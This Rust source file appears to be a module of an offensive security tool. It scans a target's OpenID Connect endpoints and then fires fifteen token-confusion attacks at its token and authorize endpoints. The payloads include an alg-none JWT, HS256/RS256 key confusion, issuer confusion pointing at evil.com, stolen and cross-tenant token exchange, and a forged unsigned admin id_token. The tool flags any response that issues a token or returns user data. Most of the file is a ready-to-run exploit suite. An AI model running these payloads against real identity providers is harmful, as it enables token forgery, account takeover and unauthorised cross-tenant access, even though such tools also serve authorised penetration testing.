use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const OIDC_ENDPOINTS: &[(&str, &str)] = &[
    ("Discovery", "/.well-known/openid-configuration"),
    ("JWKS", "/.well-known/jwks.json"),
    ("Authorization", "/oauth2/authorize"),
    ("Token", "/oauth2/token"),
    ("UserInfo", "/oauth2/userinfo"),
    ("Introspection", "/oauth2/introspect"),
    ("Revocation", "/oauth2/revoke"),
    ("End session", "/oauth2/logout"),
    ("Registration", "/oauth2/register"),
    ("Device auth", "/oauth2/device_authorization"),
];

const CONFUSION_PAYLOADS: &[(&str, &str, &str)] = &[
    (
        "Token mix-up — code as id_token",
        "id_token=AUTH_CODE&grant_type=authorization_code",
        "POST",
    ),
    (
        "Hybrid flow abuse",
        "response_type=code%20id_token&nonce=attacker",
        "GET",
    ),
    (
        "Implicit token confusion",
        "response_type=token&response_mode=fragment",
        "GET",
    ),
    ("Access token as ID token", "id_token=ACCESS_TOKEN", "POST"),
    (
        "JWT confusion — alg none",
        r#"{"alg":"none","typ":"JWT"}.{"sub":"admin","iss":"target"}"#,
        "POST",
    ),
    (
        "JWT confusion — HS256 with RS256 key",
        r#"{"alg":"HS256","typ":"JWT"}.{"sub":"admin"}"#,
        "POST",
    ),
    (
        "Issuer confusion",
        "iss=https://evil.com&target_iss=https://target.com",
        "POST",
    ),
    (
        "Audience confusion",
        "aud=evil_client_id&target_aud=target_client_id",
        "POST",
    ),
    ("Nonce reuse", "nonce=reused_nonce_value", "GET"),
    (
        "c_hash mismatch",
        "c_hash=invalid_hash&at_hash=invalid_hash",
        "POST",
    ),
    (
        "Token replay — expired",
        "token=expired_token&grant_type=urn:ietf:params:oauth:grant-type:token-exchange",
        "POST",
    ),
    (
        "Token exchange",
        "subject_token=STOLEN_TOKEN&subject_token_type=urn:ietf:params:oauth:token-type:access_token&grant_type=urn:ietf:params:oauth:grant-type:token-exchange",
        "POST",
    ),
    (
        "Refresh token as access",
        "refresh_token=STOLEN_REFRESH&grant_type=refresh_token&scope=openid",
        "POST",
    ),
    (
        "Cross-tenant token",
        "token=TENANT_A_TOKEN&tenant=TENANT_B",
        "POST",
    ),
    (
        "Claim injection",
        r#"id_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AdGFyZ2V0LmNvbSJ9."#,
        "POST",
    ),
];

pub async fn confuse(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} OIDC Token Confusion Suite", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/2] OIDC endpoint discovery...", "[*]".cyan().bold());
    let mut found_endpoints = Vec::new();
    for (name, path) in OIDC_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200 && !body.is_empty();
                let tag = if accessible {
                    "FOUND".green().bold().to_string()
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:25} {:45} {}", "*".cyan(), name, path, tag);
                if accessible {
                    found_endpoints.push((name, path, body.chars().take(300).collect::<String>()));
                }
            }
            Err(_) => {
                println!("  {} {:25} {:45} error", "*".red(), name, path);
            }
        }
    }

    println!("\n{} [2/2] Token confusion attacks...", "[*]".cyan().bold());
    println!(
        "  {} Testing {} confusion payloads...",
        "*".cyan(),
        CONFUSION_PAYLOADS.len()
    );
    let mut results = Vec::new();

    for (name, body, method) in CONFUSION_PAYLOADS {
        let token_url = format!("{}{}", base, "/oauth2/token");
        let req = if *method == "GET" {
            let auth_url = format!("{}{}?{}", base, "/oauth2/authorize", body);
            client.get(&auth_url)
        } else {
            client
                .post(&token_url)
                .header("Content-Type", "application/x-www-form-urlencoded")
                .body(body.to_string())
        };

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let resp_body = resp.text().await.unwrap_or_default();
                let has_token =
                    resp_body.contains("access_token") || resp_body.contains("id_token");
                let has_error = resp_body.contains("error") || resp_body.contains("invalid");
                let has_user = resp_body.contains("sub")
                    || resp_body.contains("email")
                    || resp_body.contains("admin");

                let tag = if has_token && !has_error {
                    "TOKEN ISSUED".red().bold().to_string()
                } else if has_user && !has_error {
                    "USER DATA".red().to_string()
                } else if has_error {
                    "rejected".green().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:40} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if (has_token || has_user) && !has_error {
                    println!(
                        "    {} {}",
                        ">".red().bold(),
                        resp_body.chars().take(200).collect::<String>()
                    );
                    results.push(*name);
                }
            }
            Err(_) => {
                println!(
                    "  {} [{:02}] {:40} error",
                    "*".red(),
                    results.len() + 1,
                    name
                );
            }
        }
    }

    println!(
        "\n{} {} / {} confusion attacks succeeded, {} endpoints discovered",
        "[*]".cyan().bold(),
        results.len(),
        CONFUSION_PAYLOADS.len(),
        found_endpoints.len()
    );

    if !results.is_empty() {
        let has_jwt = results
            .iter()
            .any(|n| n.contains("JWT") || n.contains("alg"));
        let has_replay = results
            .iter()
            .any(|n| n.contains("replay") || n.contains("exchange") || n.contains("Cross"));
        let has_mixup = results
            .iter()
            .any(|n| n.contains("mix") || n.contains("Hybrid") || n.contains("Implicit"));
        if has_jwt {
            println!(
                "{} [CRITICAL] JWT algorithm confusion — token forgery possible!",
                "[!]".red().bold()
            );
        }
        if has_replay {
            println!(
                "{} [CRITICAL] Token replay/exchange — cross-tenant access!",
                "[!]".red().bold()
            );
        }
        if has_mixup {
            println!(
                "{} [HIGH] Token mix-up — authorization code can be stolen!",
                "[!]".red().bold()
            );
        }
    } else {
        println!(
            "{} No OIDC confusion vulnerabilities detected.",
            "[-]".green().bold()
        );
    }

    Ok(())
}
